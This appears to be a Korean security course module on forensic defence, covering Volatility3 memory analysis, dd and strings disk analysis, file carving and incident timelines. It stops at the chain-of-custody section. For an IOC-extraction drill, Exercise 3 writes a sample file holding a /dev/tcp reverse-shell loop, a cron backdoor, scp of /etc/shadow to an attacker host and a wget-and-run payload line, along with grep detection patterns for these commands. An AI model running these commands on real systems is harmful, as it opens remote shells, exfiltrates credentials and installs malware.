# Week 07: 포렌식 기반 방어 — Volatility3 메모리 분석, 디스크 분석, 타임라인 구성, 증거 보존, 보고서 작성

## 학습 목표
- Volatility3를 사용하여 메모리 덤프에서 프로세스, 네트워크 연결, 악성코드 흔적을 분석할 수 있다
- dd와 strings를 활용하여 디스크 이미지에서 삭제된 파일과 악성코드 아티팩트를 추출할 수 있다
- log2timeline/plaso를 사용하여 다양한 로그 소스에서 통합 타임라인을 구성할 수 있다
- 디지털 증거 보존(Chain of Custody) 절차를 이해하고 법적 유효한 증거를 수집할 수 있다
- 사고 대응 보고서를 체계적으로 작성하여 경영진과 기술팀에 효과적으로 전달할 수 있다
- OpsClaw execute-plan을 통해 포렌식 데이터 수집과 분석을 자동화할 수 있다

## 전제 조건
- 공방전 기초 과정(course11) 이수 완료
- Week 01-06 학습 완료 (공격 기법 + 실시간 방어 이해)
- Linux 파일시스템 구조 (ext4, inode) 기초 이해
- 프로세스 관리 기초 (ps, /proc 파일시스템)
- SHA-256 해시의 용도와 의미 이해
- OpsClaw 플랫폼 기본 사용법 (프로젝트 생성, execute-plan)

## 실습 환경 (공통)

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 공격 기지 / Control Plane | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹 서버 (JuiceShop, Apache) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh, OpenCTI) | `sshpass -p1 ssh siem@10.20.30.100` |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | Part 1: Volatility3 메모리 분석 | 강의/실습 |
| 0:40-1:20 | Part 2: dd/strings 디스크 분석 | 강의/실습 |
| 1:20-1:30 | 휴식 | - |
| 1:30-2:10 | Part 3: 타임라인 구성과 증거 보존 | 강의/실습 |
| 2:10-2:50 | Part 4: 보고서 작성과 자동화 | 실습 |
| 2:50-3:00 | 휴식 | - |
| 3:00-3:20 | 종합 시나리오: 침해 사고 포렌식 워크플로우 | 실습/토론 |
| 3:20-3:40 | 검증 퀴즈 + 과제 안내 | 퀴즈 |

---

## 용어 해설

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **메모리 포렌식** | Memory Forensics | RAM 덤프를 분석하여 실행 중이던 정보 추출 | 현재 열려있는 모든 서류를 복사 |
| **디스크 포렌식** | Disk Forensics | 스토리지 이미지를 분석하여 파일/삭제 흔적 추출 | 서랍장 전체를 복사하여 조사 |
| **Volatility** | Volatility | 메모리 포렌식 프레임워크 (Python) | RAM 분석 전용 현미경 |
| **타임라인** | Timeline | 시간순 이벤트 정렬 | 사건 연표 |
| **Chain of Custody** | 증거 보존 연쇄 | 증거의 수집/이전/보관 기록 | 택배 추적 시스템 |
| **dd** | dd | 디스크 이미지 생성 도구 | 정밀 복사기 |
| **strings** | strings | 바이너리에서 문자열 추출 | 쓰레기통에서 편지 조각 찾기 |
| **plaso/log2timeline** | plaso | 다중 로그 통합 타임라인 도구 | 여러 CCTV를 하나의 타임라인으로 |
| **IOC** | Indicator of Compromise | 침해 지표 (해시, IP, 도메인 등) | 범인의 지문/발자국 |
| **아티팩트** | Artifact | 포렌식 분석에서 발견되는 증거 조각 | 범죄 현장의 증거물 |
| **Write Blocker** | 쓰기 차단기 | 증거 디스크의 변조를 방지하는 장치 | 읽기 전용 USB 어댑터 |
| **카빙** | File Carving | 파일 시그니처로 삭제된 파일 복구 | 퍼즐 조각 맞추기 |
| **VAD** | Virtual Address Descriptor | 프로세스 메모리 영역 정보 | 프로세스의 메모리 지도 |

---

# Part 1: Volatility3 메모리 분석 (40분)

## 1.1 메모리 포렌식의 중요성

메모리(RAM)에는 디스크에 기록되지 않는 중요한 정보가 존재한다. 파일리스 악성코드, 암호화 키, 네트워크 연결 정보, 복호화된 데이터 등은 메모리에서만 확인할 수 있다.

### 메모리에서만 확인 가능한 정보

```
+--------------------------------------------------------------+
|              메모리 포렌식으로 확인 가능한 정보                  |
+--------------------------------------------------------------+
|                                                              |
|  프로세스 정보:                                               |
|    - 실행 중인/은닉된 프로세스 목록                             |
|    - 프로세스 트리 (부모-자식 관계)                             |
|    - 각 프로세스의 명령줄 인자                                 |
|    - DLL/SO 주입 흔적                                        |
|                                                              |
|  네트워크 정보:                                               |
|    - 활성 TCP/UDP 연결                                       |
|    - 리스닝 포트                                              |
|    - C2 서버 연결 정보                                        |
|                                                              |
|  보안 정보:                                                   |
|    - 메모리 내 비밀번호/키                                     |
|    - 복호화된 데이터                                          |
|    - 레지스트리 하이브 (Windows)                               |
|                                                              |
|  악성코드 정보:                                               |
|    - 파일리스 악성코드 (디스크에 없음)                          |
|    - 프로세스 인젝션 흔적                                     |
|    - 루트킷이 숨기는 프로세스                                  |
|    - 셸코드                                                  |
|                                                              |
+--------------------------------------------------------------+
```

### Volatility3 주요 플러그인

| 카테고리 | 플러그인 | 분석 대상 |
|----------|---------|----------|
| **프로세스** | linux.pslist | 프로세스 목록 |
| **프로세스** | linux.pstree | 프로세스 트리 |
| **네트워크** | linux.sockstat | 네트워크 소켓 |
| **악성코드** | linux.malfind | 인젝션된 코드 |
| **파일** | linux.bash | Bash 히스토리 |
| **커널** | linux.lsmod | 로드된 커널 모듈 |
| **파일** | linux.lsof | 열린 파일 핸들 |
| **정보** | banners | OS 정보 확인 |

## 1.2 메모리 덤프 수집

### 실습 1: Linux 메모리 덤프 수집과 무결성 검증

**실습 목적**: 침해 의심 시스템에서 메모리 덤프를 수집하고, 해시값으로 무결성을 검증하는 절차를 실습한다.

**배우는 것**: LiME을 이용한 메모리 덤프 수집, SHA-256 해시로 무결성 검증, 휘발성 순서에 따른 증거 수집

```bash
# -- 침해 의심 서버에서 실행 (web 서버 가정) --

# 1. 메모리 덤프 수집 방법
echo "[+] Linux 메모리 덤프 수집 방법:"
echo ""
echo "  방법 1: LiME (Linux Memory Extractor) — 권장"
echo "    cd /opt/LiME/src && make"
echo "    insmod lime-\$(uname -r).ko 'path=/evidence/mem.lime format=lime'"
echo ""
echo "  방법 2: AVML (Microsoft)"
echo "    ./avml /evidence/mem.raw"
echo ""
echo "  방법 3: /proc/kcore"
echo "    dd if=/proc/kcore of=/evidence/kcore.raw bs=1M"

# 2. 라이브 시스템 정보 수집 (메모리 덤프 전 휘발성 데이터)
echo ""
echo "[+] 휘발성 순서(Order of Volatility)에 따른 수집:"
echo "  1순위: CPU 레지스터, 캐시 (수집 어려움)"
echo "  2순위: 메모리 (RAM) ← 최우선 수집 대상"
echo "  3순위: 네트워크 연결 상태"
echo "  4순위: 실행 중인 프로세스"
echo "  5순위: 디스크 (비휘발성이지만 변경될 수 있음)"
echo "  6순위: 백업 미디어, 로그 서버"

# 3. 라이브 수집 시뮬레이션
echo ""
echo "[+] 라이브 시스템 정보 수집 시뮬레이션:"
mkdir -p /tmp/evidence

# 프로세스 정보
ps auxf > /tmp/evidence/ps_snapshot.txt 2>/dev/null
echo "  프로세스 스냅샷: $(wc -l < /tmp/evidence/ps_snapshot.txt) 프로세스"

# 네트워크 연결
ss -tlnp > /tmp/evidence/network_listen.txt 2>/dev/null
ss -tnp > /tmp/evidence/network_established.txt 2>/dev/null
echo "  네트워크 스냅샷: 리스닝 $(wc -l < /tmp/evidence/network_listen.txt), 연결 $(wc -l < /tmp/evidence/network_established.txt)"

# 로드된 모듈
lsmod > /tmp/evidence/modules.txt 2>/dev/null
echo "  커널 모듈: $(wc -l < /tmp/evidence/modules.txt) 모듈"

# 열린 파일
ls -la /proc/*/fd 2>/dev/null | head -100 > /tmp/evidence/open_files.txt
echo "  열린 파일: /tmp/evidence/open_files.txt"

# 4. 무결성 검증
echo ""
echo "[+] 증거 무결성 검증 (SHA-256):"
for f in /tmp/evidence/*.txt; do
    if [ -f "$f" ]; then
        hash=$(sha256sum "$f" | awk '{print $1}')
        echo "  $(basename $f): ${hash:0:32}..."
    fi
done

# 5. 메모리 크기와 수집 시간 예측
echo ""
echo "[+] 메모리 수집 시간 예측:"
MEM_TOTAL=$(grep MemTotal /proc/meminfo | awk '{print $2}')
MEM_GB=$(echo "scale=1; $MEM_TOTAL / 1048576" | bc)
echo "  시스템 메모리: ${MEM_GB} GB"
echo "  예상 수집 시간 (SSD): ~$(echo "scale=0; $MEM_TOTAL / 1048576 * 30" | bc)초"
echo "  예상 수집 시간 (네트워크): ~$(echo "scale=0; $MEM_TOTAL / 1048576 * 300" | bc)초"
```

**명령어 해설**:
- `insmod lime.ko 'path=/evidence/mem.lime format=lime'`: LiME 커널 모듈을 로드하여 전체 물리 메모리를 파일로 덤프한다
- `sha256sum`: 파일의 SHA-256 해시를 계산하여 무결성 검증에 사용한다
- `ps auxf`: 모든 프로세스를 트리 구조로 표시한다
- `ss -tlnp`: TCP 리스닝 포트와 연결된 프로세스를 표시한다

**결과 해석**: 메모리 덤프는 시스템의 현재 상태를 있는 그대로 보존한다. 전원이 꺼지면 RAM의 모든 데이터가 소멸하므로, 침해 발견 즉시 메모리 덤프를 수집하는 것이 최우선이다. SHA-256 해시는 증거가 변조되지 않았음을 증명하는 핵심 요소이다.

**실전 활용**: 사고 대응 절차에서 메모리 덤프 수집은 휘발성 순서에 따라 가장 먼저 수행해야 한다. 라이브 시스템에서 수집할 때는 수집 도구 자체가 메모리를 변경하므로, 사전에 USB 드라이브에 수집 도구를 준비해두어야 한다.

**트러블슈팅**:
- LiME 빌드 실패: 커널 헤더 설치 → `apt install linux-headers-$(uname -r)`
- 메모리 부족: 외부 스토리지(USB, NFS)에 직접 저장
- 덤프 중 시스템 불안정: `format=lime`이 가장 안정적

## 1.3 Volatility3 메모리 분석

### 실습 2: Volatility3 프로세스 및 네트워크 분석

**실습 목적**: Volatility3의 핵심 플러그인을 사용하여 메모리 덤프에서 악성 프로세스와 네트워크 연결을 식별한다.

**배우는 것**: Volatility3 기본 사용법, 프로세스/네트워크/악성코드 분석, 의심 프로세스 식별 기준

```bash
# -- opsclaw 서버에서 실행 --

# 1. Volatility3 설치
echo "[+] Volatility3 설치:"
echo "  pip3 install volatility3"
echo "  # 또는 소스"
echo "  git clone https://github.com/volatilityfoundation/volatility3.git"
echo "  cd volatility3 && pip3 install -e ."

# 2. 핵심 플러그인 사용법
echo ""
echo "[+] Volatility3 핵심 분석 명령:"
echo ""
echo "  -- 프로세스 분석 --"
echo "  vol -f mem.lime linux.pslist      # 프로세스 목록"
echo "  vol -f mem.lime linux.pstree      # 프로세스 트리"
echo "  vol -f mem.lime linux.bash        # Bash 히스토리"
echo "  vol -f mem.lime linux.lsof        # 열린 파일"
echo ""
echo "  -- 네트워크 분석 --"
echo "  vol -f mem.lime linux.sockstat    # 소켓 정보"
echo ""
echo "  -- 악성코드 분석 --"
echo "  vol -f mem.lime linux.malfind     # 코드 인젝션 탐지"
echo "  vol -f mem.lime linux.lsmod       # 커널 모듈"
echo ""
echo "  -- OS 정보 --"
echo "  vol -f mem.lime banners           # OS 버전 확인"

# 3. 의심 프로세스 식별 기준
echo ""
echo "[+] 의심 프로세스 식별 기준:"
echo "  +----------------------------------------------------------+"
echo "  | 기준                    | 정상              | 의심       |"
echo "  +----------------------------------------------------------+"
echo "  | 실행 경로               | /usr/bin, /sbin   | /tmp, /dev |"
echo "  | 부모 프로세스           | systemd(1), 셸    | 비정상 부모 |"
echo "  | 이름                    | 알려진 서비스명    | 유사 이름   |"
echo "  | 네트워크               | 알려진 포트        | 외부 C2    |"
echo "  | 메모리 권한            | RX, RW            | RWX        |"
echo "  | 시작 시간              | 부팅 시            | 최근       |"
echo "  +----------------------------------------------------------+"

# 4. 분석 결과 시뮬레이션
echo ""
echo "[+] 프로세스 분석 결과 시뮬레이션:"
echo "  +-------+-------+------------+--------------------------------+"
echo "  | PID   | PPID  | Name       | CMD                            |"
echo "  +-------┼-------┼------------┼--------------------------------+"
echo "  | 1     | 0     | systemd    | /sbin/init                     |"
echo "  | 1234  | 1     | sshd       | /usr/sbin/sshd -D              |"
echo "  | 5678  | 1234  | sshd       | sshd: root@pts/0               |"
echo "  | 5679  | 5678  | bash       | -bash                          |"
echo "  | 5680  | 5679  | python3    | python3 -c 'import socket...'  |"
echo "  | 9999  | 1     | kworker    | [kworker/0:2]    ← 의심       |"
echo "  | 10001 | 2     | syslogd    | /tmp/.hidden/syslogd ← 의심   |"
echo "  +-------+-------+------------+--------------------------------+"
echo ""
echo "  의심 포인트:"
echo "    PID 5680: SSH → bash → python3 (리버스 셸 패턴)"
echo "    PID 9999: PPID=1이지만 커널 스레드로 위장 (정상은 PPID=2)"
echo "    PID 10001: /tmp/.hidden/ 경로의 바이너리 (비정상 경로)"

# 5. 네트워크 분석 시뮬레이션
echo ""
echo "[+] 네트워크 연결 분석:"
echo "  +--------+------------------+----------------------+--------+"
echo "  | Proto  | Local            | Foreign              | PID    |"
echo "  +--------┼------------------┼----------------------┼--------+"
echo "  | TCP    | 0.0.0.0:22       | 0.0.0.0:*            | 1234   |"
echo "  | TCP    | 0.0.0.0:80       | 0.0.0.0:*            | 2345   |"
echo "  | TCP    | 10.20.30.80:49152| 185.142.xx.xx:4444   | 5680   |"
echo "  | UDP    | 10.20.30.80:0    | 8.8.8.8:53           | 5680   |"
echo "  +--------+------------------+----------------------+--------+"
echo ""
echo "  PID 5680 → 185.142.xx.xx:4444 (C2 서버 리버스 셸)"

# 6. malfind 분석
echo ""
echo "[+] malfind (코드 인젝션 탐지):"
echo "  Process: python3 (PID 5680)"
echo "  VAD: 0x7f0000400000-0x7f0000401000"
echo "  Protection: PAGE_EXECUTE_READWRITE"
echo "  → 정상 프로세스에서 RWX 권한은 비정상 → 코드 인젝션 의심"
echo ""
echo "  Process: kworker (PID 9999)"
echo "  VAD: 0x00400000-0x00450000"
echo "  Protection: PAGE_EXECUTE_READWRITE"
echo "  → 커널 스레드가 사용자 공간 메모리를 가짐 → 루트킷 의심"
```

**명령어 해설**:
- `vol -f mem.lime linux.pslist`: 메모리 덤프에서 프로세스 목록을 추출한다
- `vol -f mem.lime linux.pstree`: 부모-자식 관계를 트리 구조로 표시한다
- `vol -f mem.lime linux.malfind`: PAGE_EXECUTE_READWRITE 권한 등 의심스러운 메모리 영역을 탐지한다
- `vol -f mem.lime linux.sockstat`: 프로세스별 네트워크 소켓 정보를 표시한다

**결과 해석**: 메모리 분석에서 "비정상 패턴"을 식별하는 것이 핵심이다. /tmp에서 실행되는 바이너리, 외부 IP로의 리버스 셸, PAGE_EXECUTE_READWRITE 메모리 영역은 모두 IOC이다. 프로세스 트리에서 SSH → bash → python3 체인은 전형적인 리버스 셸 패턴이다.

**실전 활용**: 파일리스 악성코드는 디스크에 흔적을 남기지 않으므로 메모리 분석이 유일한 탐지 방법이다. PowerShell, Python 등 정상 인터프리터를 악용하는 LotL(Living off the Land) 공격은 프로세스 트리와 명령줄 분석으로 탐지해야 한다.

**트러블슈팅**:
- Volatility3 프로필 오류: `vol -f mem.lime banners`로 OS 확인 후 심볼 테이블 다운로드
- 분석 속도: SSD에서 분석, `--output json`으로 결과 저장
- 플러그인 미지원: OS 버전에 따라 Volatility2 병행 사용

---

# Part 2: dd/strings 디스크 분석 (40분)

## 2.1 디스크 포렌식의 원리

디스크 포렌식은 스토리지 장치의 비트 단위 이미지를 분석하여 파일, 삭제된 데이터, 악성코드 아티팩트를 추출하는 과정이다.

### 디스크 포렌식 워크플로우

```
+--------------------------------------------------------------+
|                  디스크 포렌식 워크플로우                       |
+--------------------------------------------------------------+
|                                                              |
|  1. 이미지 생성 (dd/dc3dd)                                   |
|     +→ 원본 디스크의 비트 단위 복제                            |
|     +→ SHA-256 해시로 무결성 검증                             |
|                                                              |
|  2. 파일시스템 분석 (sleuthkit/autopsy)                       |
|     +→ 파일/디렉토리 구조 탐색                                |
|     +→ 삭제된 파일 복구 (inode 분석)                          |
|     +→ 타임스탬프 분석 (MAC 시간)                             |
|                                                              |
|  3. 문자열 추출 (strings)                                     |
|     +→ IP, URL, 파일 경로, 명령어 등                          |
|                                                              |
|  4. 파일 카빙 (foremost/scalpel)                              |
|     +→ 파일 시그니처로 삭제된 파일 복구                        |
|                                                              |
|  5. 아티팩트 분석                                             |
|     +→ 로그, 히스토리, SSH 키, 크론탭 등                      |
|                                                              |
+--------------------------------------------------------------+
```

## 2.2 디스크 이미지 생성과 분석

### 실습 3: dd를 활용한 디스크 이미지 생성과 strings 분석

**실습 목적**: dd를 사용하여 디스크 이미지를 생성하고, strings와 grep으로 악성코드 아티팩트를 검색하는 기법을 실습한다.

**배우는 것**: dd 이미징, dc3dd 해시 검증, strings 문자열 추출, IOC 패턴 검색

```bash
# -- opsclaw 서버에서 실행 --

# 1. 디스크 이미징 명령
echo "[+] 디스크 이미징 명령:"
echo ""
echo "  # dd (기본)"
echo "  dd if=/dev/sda of=/evidence/disk.img bs=4M status=progress"
echo ""
echo "  # dc3dd (해시 자동 계산)"
echo "  dc3dd if=/dev/sda of=/evidence/disk.img hash=sha256 log=imaging.log"
echo ""
echo "  # 압축 이미지"
echo "  dd if=/dev/sda bs=4M | gzip > /evidence/disk.img.gz"
echo ""
echo "  # 네트워크 이미징"
echo "  dd if=/dev/sda bs=4M | ssh analyst@forensic-ws 'dd of=/evidence/disk.img'"

# 2. strings 분석 시뮬레이션
echo ""
echo "[+] 악성코드 아티팩트 시뮬레이션:"

# 테스트 데이터 생성
cat << 'MALWARE_EOF' > /tmp/test_artifacts.bin
BINARY_HEADER_DATA_PADDING_XXXX
http://185.142.99.100:4444/beacon
/tmp/.hidden/backdoor.sh
#!/bin/bash
while true; do bash -i >& /dev/tcp/185.142.99.100/4444 0>&1; sleep 60; done
crontab_entry_start
*/5 * * * * /tmp/.hidden/backdoor.sh
crontab_entry_end
mysql -u root -p'DBp@ssw0rd!' -h 10.20.30.50
scp /etc/shadow attacker@185.142.99.100:/loot/
wget http://malware-repo.evil.com/payload.elf -O /tmp/.x
chmod +x /tmp/.x && /tmp/.x
SSH_KEY_MATERIAL_BELOW
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmU
MALWARE_EOF

# 바이너리 노이즈 추가
dd if=/dev/urandom bs=1024 count=10 >> /tmp/test_artifacts.bin 2>/dev/null

echo "  테스트 파일 생성 완료"

# 3. strings 분석
echo ""
echo "[+] strings 분석 결과:"
echo ""

echo "  -- IP 주소 추출 --"
strings /tmp/test_artifacts.bin | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u

echo ""
echo "  -- URL 추출 --"
strings /tmp/test_artifacts.bin | grep -oE 'https?://[^ ]+' | sort -u

echo ""
echo "  -- 숨겨진 경로 --"
strings /tmp/test_artifacts.bin | grep '/\.' | sort -u

echo ""
echo "  -- 크리덴셜 패턴 --"
strings /tmp/test_artifacts.bin | grep -iE "(password|passwd|secret|key)" | sort -u

echo ""
echo "  -- 지속성 메커니즘 --"
strings /tmp/test_artifacts.bin | grep -E '(crontab|\*/[0-9]|@reboot|systemctl)' | sort -u

echo ""
echo "  -- 악성 명령어 --"
strings /tmp/test_artifacts.bin | grep -E '(wget|curl|chmod \+x|/dev/tcp|nc -e)' | sort -u

# 4. IOC 자동 추출 스크립트
echo ""
echo "[+] IOC 자동 추출 스크립트:"
cat << 'IOC_SCRIPT'
#!/bin/bash
# /opt/scripts/extract_ioc.sh
FILE=$1
echo "=== IOC Report ==="
echo "[IP Addresses]"
strings "$FILE" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u | grep -v '^127\.' | grep -v '^10\.' | grep -v '^192\.168\.'
echo ""
echo "[URLs]"
strings "$FILE" | grep -oE 'https?://[^ ]+' | sort -u
echo ""
echo "[Domains]"
strings "$FILE" | grep -oE '[a-zA-Z0-9.-]+\.(com|net|org|ru|cn|evil)' | sort -u
echo ""
echo "[Email]"
strings "$FILE" | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u
echo ""
echo "[File Paths]"
strings "$FILE" | grep -E '^(/tmp/|/dev/shm/|/var/tmp/)' | sort -u
echo ""
echo "[SSH Keys]"
strings "$FILE" | grep -c 'BEGIN.*PRIVATE KEY'
IOC_SCRIPT

# 정리
rm -f /tmp/test_artifacts.bin
```

**명령어 해설**:
- `dd if=/dev/sda of=disk.img bs=4M`: 디스크를 4MB 블록 단위로 비트 단위 복제한다
- `dc3dd hash=sha256`: 이미징 중 SHA-256 해시를 자동 계산한다
- `strings file`: 바이너리에서 인쇄 가능한 문자열(4자 이상)을 추출한다
- `grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}'`: 정규표현식으로 IP 주소를 추출한다

**결과 해석**: 디스크 이미지에서 strings로 외부 IP(C2 서버), 숨겨진 파일 경로, 크리덴셜, 지속성 메커니즘을 발견할 수 있다. 이 IOC들은 공격자의 TTPs를 재구성하는 핵심 증거이다. 내부 IP(10.x, 192.168.x)를 필터링하고 외부 IP에 집중한다.

**실전 활용**: 대용량 디스크의 전체 strings 분석은 시간이 오래 걸리므로, 알려진 IOC로 먼저 검색한 후 관련 영역을 심층 분석하는 것이 효율적이다.

**트러블슈팅**:
- dd 이미징 중 에러: `conv=noerror,sync` 옵션으로 배드 섹터 건너뛰기
- strings 결과 과다: `strings -n 10`으로 최소 길이 증가
- 인코딩 문제: `strings -e l` (UTF-16LE) 옵션으로 Unicode 문자열도 추출

### 실습 4: 삭제된 파일 복구와 파일 카빙

**실습 목적**: 파일 시그니처 기반 카빙으로 디스크 이미지에서 삭제된 파일을 복구한다.

**배우는 것**: foremost 파일 카빙, Sleuth Kit 사용법, 파일 시그니처(매직 넘버)의 원리

```bash
# -- opsclaw 서버에서 실행 --

# 1. 파일 시그니처 (매직 넘버)
echo "[+] 주요 파일 시그니처:"
echo "  +------------+--------------+-----------------+"
echo "  | 파일 형식  | 시그니처 (Hex) | ASCII          |"
echo "  +------------┼--------------┼-----------------+"
echo "  | JPEG       | FF D8 FF     | (바이너리)      |"
echo "  | PNG        | 89 50 4E 47  | .PNG            |"
echo "  | PDF        | 25 50 44 46  | %PDF            |"
echo "  | ZIP        | 50 4B 03 04  | PK..            |"
echo "  | ELF        | 7F 45 4C 46  | .ELF            |"
echo "  | GZIP       | 1F 8B        | (바이너리)      |"
echo "  | SQLite     | 53 51 4C 69  | SQLi            |"
echo "  +------------+--------------+-----------------+"

# 2. foremost 사용법
echo ""
echo "[+] foremost 파일 카빙:"
echo "  foremost -i disk.img -o /evidence/carved/"
echo "  foremost -t jpg,png,pdf,zip,elf -i disk.img -o /evidence/carved/"
echo "  cat /evidence/carved/audit.txt  # 카빙 결과 보고서"

# 3. Sleuth Kit 사용법
echo ""
echo "[+] Sleuth Kit 분석:"
echo "  fsstat disk.img                    # 파일시스템 정보"
echo "  fls -r -d disk.img                 # 삭제 파일 목록"
echo "  icat disk.img 12345 > recovered    # inode로 파일 복구"
echo "  mactime -d -b bodyfile > timeline  # MAC 타임라인"

# 4. 카빙 도구 비교
echo ""
echo "[+] 파일 카빙 도구 비교:"
echo "  +--------------+----------------------------------------+"
echo "  | 도구         | 특징                                   |"
echo "  +--------------┼----------------------------------------+"
echo "  | foremost     | 빠름, 기본 시그니처, 검증됨             |"
echo "  | scalpel      | 커스텀 시그니처, foremost 기반          |"
echo "  | photorec     | 다양한 형식, 대화형                    |"
echo "  | binwalk      | 펌웨어/임베디드 분석                   |"
echo "  | bulk_extractor| 대용량, 자동 패턴 추출               |"
echo "  +--------------+----------------------------------------+"

# 5. 악성코드 해시 비교
echo ""
echo "[+] 악성코드 해시 비교 (VirusTotal):"
echo "  sha256sum suspicious_file"
echo "  curl -s 'https://www.virustotal.com/api/v3/files/{hash}' \\"
echo "    -H 'x-apikey: YOUR_KEY' | jq '.data.attributes.last_analysis_stats'"
```

**명령어 해설**:
- `foremost -i disk.img -o carved/`: 파일 시그니처를 검색하여 삭제된 파일을 복구한다
- `fls -r -d disk.img`: 삭제된 파일(-d) 목록을 재귀적(-r)으로 표시한다
- `icat disk.img 12345`: inode 번호로 파일 내용을 추출한다

**결과 해석**: 파일이 삭제되어도 데이터 블록이 덮어쓰이지 않았으면 카빙으로 복구할 수 있다. 공격자가 삭제한 악성코드, 유출 데이터 사본, 공격 도구를 복구하면 공격의 전체 그림을 파악할 수 있다.

**실전 활용**: SSD의 TRIM 기능은 삭제 즉시 데이터를 지우므로 SSD 포렌식은 어렵다. HDD는 상대적으로 복구율이 높다. 중요 서버는 HDD를 사용하거나, 로그를 별도 서버에 저장하는 것이 포렌식에 유리하다.

**트러블슈팅**:
- foremost 설치: `sudo apt install foremost`
- 카빙 결과 깨진 파일: 단편화(fragmentation) 문제
- Sleuth Kit 미지원 FS: ext4, NTFS, FAT 등 주요 FS 지원

---

# Part 3: 타임라인 구성과 증거 보존 (40분)

## 3.1 타임라인 분석의 중요성

타임라인은 사고 발생 전후의 모든 이벤트를 시간순으로 정렬한 것이다. "무엇이 언제 일어났는가"를 파악하면 공격의 진입점, 확산 경로, 유출 시점을 정확히 재구성할 수 있다.

### 실습 5: 통합 타임라인 생성

**실습 목적**: plaso(log2timeline)와 수동 방법으로 여러 로그 소스를 통합 타임라인으로 구성하고, 침해 사고를 재구성한다.

**배우는 것**: plaso 사용법, 다중 로그 파싱, 타임라인 필터링, 피벗 포인트 분석

```bash
# -- opsclaw 서버에서 실행 --

# 1. plaso (log2timeline) 사용법
echo "[+] plaso 타임라인 생성:"
echo "  # Step 1: 로그 파싱"
echo "  log2timeline.py /evidence/timeline.plaso /evidence/disk.img"
echo ""
echo "  # Step 2: 타임라인 출력"
echo "  psort.py -o l2tcsv /evidence/timeline.plaso -w timeline.csv"
echo ""
echo "  # Step 3: 시간 범위 필터"
echo "  psort.py -o l2tcsv /evidence/timeline.plaso \\"
echo "    --date-filter '2026-03-25T00:00:00..2026-03-26T00:00:00' \\"
echo "    -w timeline_filtered.csv"

# 2. 수동 타임라인 구성 스크립트
echo ""
echo "[+] 수동 타임라인 구성 스크립트:"
cat << 'TIMELINE_SCRIPT'
#!/bin/bash
# /opt/scripts/build_timeline.sh

TIMELINE="/tmp/evidence/timeline.csv"
echo "timestamp,source,event,detail" > "$TIMELINE"

# auth.log
grep -E "(Accepted|Failed|session)" /var/log/auth.log 2>/dev/null | \
while read -r line; do
    ts=$(echo "$line" | awk '{print $1, $2, $3}')
    event=$(echo "$line" | grep -o 'Accepted\|Failed\|session opened\|session closed')
    echo "$ts,auth.log,$event,\"$(echo $line | cut -c1-100)\"" >> "$TIMELINE"
done

# Suricata
cat /var/log/suricata/eve.json 2>/dev/null | \
  jq -r 'select(.event_type == "alert") | 
  [.timestamp, "suricata", .alert.signature, .src_ip + "->" + .dest_ip] | @csv' \
  >> "$TIMELINE" 2>/dev/null

# 파일시스템 변경
find /var/www /tmp /etc -maxdepth 3 -mtime -7 -printf '%T+ filesystem modified %p\n' 2>/dev/null | \
  sort >> "$TIMELINE"

echo "[+] 타임라인 완료: $(wc -l < "$TIMELINE") 이벤트"
TIMELINE_SCRIPT

# 3. 타임라인 분석 예시
echo ""
echo "[+] 침해 사고 타임라인 (시뮬레이션):"
echo "  +--------------------+----------+--------------------------------+"
echo "  | 시간               | 소스     | 이벤트                          |"
echo "  +--------------------┼----------┼--------------------------------+"
echo "  | 03-25 10:15:23     | apache   | SQLi 탐지 (10.0.0.55)          |"
echo "  | 03-25 10:15:45     | suricata | SQL Injection alert             |"
echo "  | 03-25 10:16:02     | apache   | 웹셸 업로드 (cmd.php)           |"
echo "  | 03-25 10:16:30     | filesystem| /var/www/uploads/cmd.php 생성  |"
echo "  | 03-25 10:17:15     | auth.log | www-data → root (sudo)          |"
echo "  | 03-25 10:18:00     | filesystem| /tmp/.hidden/ 디렉토리 생성    |"
echo "  | 03-25 10:18:30     | auth.log | SSH 세션 (root, 10.0.0.55)      |"
echo "  | 03-25 10:19:00     | suricata | C2 연결 (185.142.xx.xx:4444)    |"
echo "  | 03-25 10:25:00     | auth.log | scp /etc/shadow → 외부          |"
echo "  | 03-25 10:30:00     | crontab  | 백도어 지속성 등록               |"
echo "  +--------------------+----------+--------------------------------+"
echo ""
echo "  피벗 포인트: 10:15:23 SQLi → 15분 내 전체 킬체인 완료"
echo "  ATT&CK 매핑:"
echo "    T1190 (초기 접근) → T1505.003 (웹셸) → T1068 (권한 상승)"
echo "    → T1059.004 (셸) → T1071.001 (C2) → T1048 (유출) → T1053.003 (지속성)"
```

**명령어 해설**:
- `log2timeline.py output.plaso disk.img`: 모든 아티팩트를 파싱하여 plaso DB로 저장한다
- `psort.py -o l2tcsv`: CSV 형식으로 타임라인을 출력한다
- `--date-filter`: 특정 시간 범위의 이벤트만 필터링한다
- `find -mtime -7 -printf '%T+ %p\n'`: 최근 7일 내 수정된 파일의 타임스탬프와 경로를 출력한다

**결과 해석**: 통합 타임라인으로 공격의 전체 흐름을 재구성할 수 있다. 이 예시에서 SQLi로 시작하여 약 15분 만에 웹셸 → 권한 상승 → C2 → 데이터 유출 → 지속성 확보까지 완료되었다. "피벗 포인트"(10:15:23 SQLi)를 기준으로 전후 이벤트를 추적한다.

**실전 활용**: 여러 서버의 타임라인을 NTP로 동기화하여 통합 분석하면 측면 이동 경로도 파악할 수 있다. 타임라인의 "빈 구간"은 로그가 삭제되었거나 수집되지 않은 것이므로 추가 조사가 필요하다.

**트러블슈팅**:
- plaso 설치 오류: Docker 버전 권장
- 타임존 불일치: UTC로 통일
- 대용량 로그: `--date-filter`로 범위 제한

### 실습 6: 증거 보존 (Chain of Custody)

